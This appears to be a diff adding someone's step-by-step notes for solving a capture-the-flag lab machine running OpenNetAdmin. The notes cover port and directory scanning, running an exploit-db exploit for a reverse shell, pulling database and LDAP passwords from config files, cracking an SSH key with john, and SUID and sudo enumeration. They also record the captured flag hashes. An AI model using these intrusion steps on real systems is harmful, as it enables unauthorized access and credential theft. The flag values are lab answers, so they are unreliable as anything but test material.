@@ -1,0 +1,58 @@
+nmap -sV -sC 10.10.10.171
+gobuster dir -u http://10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out
+browse website
+find ona
+sql injection (failed)
+searchsploit opennetadmin
+cp /usr/share/exploitdb/exploits/php/webapps/47691.sh .
+dos2unix
+run exploit on http://10.10.10.171/ona/index.php
+get a reverse shell
+check /etc/passwd but not much there apart from names (jimmy and jenny)
+check config
+
+in /config/config.inc.php
+// Include the localized Database settings
+$dbconffile = "{$base}/local/config/database_settings.inc.php";
+
+in /config/auth_ldap.config.php
+mysecretbindpassword
+
+in local/config/database_settings.inc.php
+array (
+        'db_type' => 'mysqli',
+        'db_host' => 'localhost',
+        'db_login' => 'ona_sys',
+        'db_passwd' => 'n1nj4W4rri0R!',
+        'db_database' => 'ona_default',
+        'db_debug' => false,
+      ),
+
+this password works with jimmy
+
+ls -la (a shows hidden files)
+
+netstat -tl (listening ports over tcp)
+
+ssh2john 
+
+john --format=SSH --wordlist=/usr/share/wordlists/rockyou.txt rsa_john
+bloodninjas
+
+thought i had to decode the hashed file in index.php
+
+ssh -i to pass in the private key file
+chmod 600 to limit access to file
+
+c9b2cf07d40807e62af62660f0c81b5f
+
+
+
+find / -perm -u=s -type f 2>/dev/null
+(find suid stuff)
+
+sudo -l
+
+search for root.txt in nano
+
+2f907ed450b361b2c2bf4e8795d5b561
